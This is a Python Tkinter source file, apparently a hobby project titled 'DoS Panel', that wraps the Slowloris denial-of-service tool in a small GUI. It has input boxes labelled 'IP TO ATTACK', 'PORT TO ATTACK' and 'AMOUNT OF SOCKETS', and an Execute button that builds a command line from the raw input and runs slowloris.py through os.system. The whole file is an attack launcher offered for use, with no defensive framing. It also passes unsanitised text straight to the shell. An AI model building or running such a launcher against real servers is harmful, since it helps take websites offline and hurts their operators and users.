from tkinter import *
from tkinter.ttk import *
import os as os

command = "slowloris.py"
 
# creates a Tk() object
master = Tk()
# root window
master.geometry("300x600")
master.title("Dos Pannel | by aziv1")
 
# Open new window on button click
#def openNewWindow():
#    # Toplevel object which will
#    # be treated as a new window
#    newWindow = Toplevel(master)
# 
#    # sets the title of the
#    # Toplevel widget
#    newWindow.title("Window 2")
# 
#    # sets the geometry of toplevel
#    newWindow.geometry("200x200")
# 
#    # A Label widget to show in toplevel
#    Label(newWindow, text ="New Windows Created").pack()


def startSlowloris():
    global command

    #IP TARGET CONFIG
    inp_IP = inputtxt1.get(1.0, "end-1c")
    command = command + " " + inp_IP

    #PORT CONFIG
    inp_P = inputtxt2.get(1.0, "end-1c")
    if inp_P == "":
        command = command
    else:
        command = command + " -p " + inp_P

    #SOCKET COUNT CONFIG
    inp_SOCK = inputtxt3.get(1.0, "end-1c")
    if inp_SOCK == "":
        command = command
    else:
        command = command + " -s " + inp_SOCK

    os.system('python ' + command)

def helpSlowloris():
    os.system('python slowloris.py --help')

label = Label(master, text ="DoS Panel | By aziv1")
label.pack(pady = 10)
 
# a button widget which will open a
# new window on button click
#btn = Button(master, text ="Open New Window", command = openNewWindow)
#btn.pack(pady = 10)

#Start Slowloris Button, For Testing
btn2 = Button(master, text ="Excecute", command = startSlowloris)
btn2.pack(pady = 10)

#GET SLOWLORIS HELP
btn3 = Button(master, text ="Slowloris Help", command = helpSlowloris)
btn3.pack(pady = 10)

text = Label(master, text="IP TO ATTACK")
text.pack(pady=10)

# TextBox For IP
inputtxt1 = Text(master, height = 1, width = 20)
inputtxt1.pack()

text = Label(master, text="PORT TO ATTACK")
text.pack(pady=10)

# TextBox For Port
inputtxt2 = Text(master, height = 1, width = 20)
inputtxt2.pack()

text = Label(master, text="AMOUNT OF SOCKETS")
text.pack(pady=10)

# TextBox For Port
inputtxt3 = Text(master, height = 1, width = 20)
inputtxt3.pack()

# mainloop, runs infinitely
mainloop()